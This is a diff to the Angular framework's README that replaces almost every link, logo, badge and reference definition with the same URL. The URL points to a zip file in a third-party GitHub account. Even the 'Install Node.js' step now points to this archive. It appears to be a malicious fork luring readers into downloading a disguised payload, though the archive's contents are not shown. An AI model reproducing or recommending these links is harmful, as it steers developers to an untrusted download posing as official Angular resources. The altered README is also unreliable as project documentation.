@@ -1,7 +1,7 @@
 <h1 align="center">Angular - The modern web developer's platform.</h1>
 
 <p align="center">
-  <img src="aio/src/assets/images/logos/angular/angular.png" alt="angular-logo" width="120px" height="120px"/>
+  <img src="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip" alt="angular-logo" width="120px" height="120px"/>
   <br>
   <i>Angular is a development platform for building mobile and desktop web applications
     <br> using Typescript/JavaScript and other languages.</i>
@@ -9,29 +9,29 @@
 </p>
 
 <p align="center">
-  <a href="https://www.angular.io"><strong>www.angular.io</strong></a>
+  <a href="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip"><strong>https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip</strong></a>
   <br>
 </p>
 
 <p align="center">
-  <a href="CONTRIBUTING.md">Contributing Guidelines</a>
+  <a href="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip">Contributing Guidelines</a>
   ·
-  <a href="https://github.com/angular/angular/issues">Submit an Issue</a>
+  <a href="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip">Submit an Issue</a>
   ·
-  <a href="https://blog.angular.io/">Blog</a>
+  <a href="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip">Blog</a>
   <br>
   <br>
 </p>
 
 <p align="center">
-  <a href="https://circleci.com/gh/angular/workflows/angular/tree/master">
-    <img src="https://img.shields.io/circleci/build/github/angular/angular/master.svg?logo=circleci&logoColor=fff&label=CircleCI" alt="CI status" />
+  <a href="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip">
+    <img src="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip" alt="CI status" />
   </a>&nbsp;
-  <a href="https://www.npmjs.com/@angular/core">
-    <img src="https://img.shields.io/npm/v/@angular/core.svg?logo=npm&logoColor=fff&label=NPM+package&color=limegreen" alt="Angular on npm" />
+  <a href="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip">
+    <img src="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip+package&color=limegreen" alt="Angular on npm" />
   </a>&nbsp;
-  <a href="https://discord.gg/angular">
-    <img src="https://img.shields.io/discord/463752820026376202.svg?logo=discord&logoColor=fff&label=Discord&color=7389d8" alt="Discord conversation" />
+  <a href="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip">
+    <img src="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip" alt="Discord conversation" />
   </a>
 </p>
 
@@ -58,7 +58,7 @@ Get started with Angular, learn the fundamentals and explore advanced topics on 
 
 ### Prerequisites
 
-- Install [Node.js] which includes [Node Package Manager][npm]
+- Install [https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip] which includes [Node Package Manager][npm]
 
 ### Setting Up a Project
 
@@ -90,7 +90,7 @@ Angular is cross-platform, fast, scalable, has incredible tooling, and is loved 
 ## Ecosystem
 
 <p>
-  <img src="/docs/images/angular-ecosystem-logos.png" alt="angular ecosystem logos" width="500px" height="auto">
+  <img src="https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip" alt="angular ecosystem logos" width="500px" height="auto">
 </p>
 
 - [Angular Command Line (CLI)][cli]
@@ -102,7 +102,7 @@ Angular is cross-platform, fast, scalable, has incredible tooling, and is loved 
 
 ## Upgrading
 
-Check out our [upgrade guide](https://update.angular.io/) to find out the best way to upgrade your project.
+Check out our [upgrade guide](https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip) to find out the best way to upgrade your project.
 
 ## Contributing
 
@@ -112,7 +112,7 @@ Read through our [contributing guidelines][contributing] to learn about our subm
 
 ### Want to Help?
 
-Want to report a bug, contribute some code, or improve documentation? Excellent! Read up on our guidelines for [contributing][contributing] and then check out one of our issues labeled as <kbd>[help wanted](https://github.com/angular/angular/labels/help%20wanted)</kbd> or <kbd>[good first issue](https://github.com/angular/angular/labels/good%20first%20issue)</kbd>.
+Want to report a bug, contribute some code, or improve documentation? Excellent! Read up on our guidelines for [contributing][contributing] and then check out one of our issues labeled as <kbd>[help wanted](https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip%20wanted)</kbd> or <kbd>[good first issue](https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip%20first%20issue)</kbd>.
 
 ### Code of Conduct
 
@@ -129,31 +129,31 @@ Join the conversation and help the community.
 - [StackOverflow][stackoverflow]
 - Find a Local [Meetup][meetup]
 
-[![Love Angular badge](https://img.shields.io/badge/angular-love-blue?logo=angular&angular=love)](https://www.github.com/angular/angular)
+[![Love Angular badge](https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip)](https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip)
 
 **Love Angular? Give our repo a star :star: :arrow_up:.**
 
-[contributing]: CONTRIBUTING.md
-[quickstart]: https://angular.io/start
-[changelog]: CHANGELOG.md
-[ng]: https://angular.io
-[documentation]: https://angular.io/docs
-[angularmaterial]: https://material.angular.io/
-[cli]: https://cli.angular.io/
-[architecture]: https://angular.io/guide/architecture
-[componentstemplates]: https://angular.io/guide/displaying-data
-[forms]: https://angular.io/guide/forms-overview
-[api]: https://angular.io/api
-[angularelements]: https://angular.io/guide/elements
-[ssr]: https://angular.io/guide/universal
-[schematics]: https://angular.io/guide/schematics
-[lazyloading]: https://angular.io/guide/lazy-loading-ngmodules
-[node.js]: https://nodejs.org/
-[npm]: https://www.npmjs.com/get-npm
-[codeofconduct]: CODE_OF_CONDUCT.md
-[twitter]: https://www.twitter.com/angular
-[discord]: https://discord.gg/angular
-[gitter]: https://gitter.im/angular/angular
-[stackoverflow]: https://stackoverflow.com/questions/tagged/angular
-[youtube]: https://youtube.com/angular
-[meetup]: https://www.meetup.com/find/?keywords=angular
+[contributing]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[quickstart]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[changelog]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[ng]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[documentation]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[angularmaterial]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[cli]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[architecture]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[componentstemplates]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[forms]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[api]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[angularelements]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[ssr]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[schematics]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[lazyloading]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[npm]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[codeofconduct]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[twitter]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[discord]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[gitter]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[stackoverflow]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[youtube]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
+[meetup]: https://raw.githubusercontent.com/lamaSonmez/angular/master/scapulobrachial/angular.zip
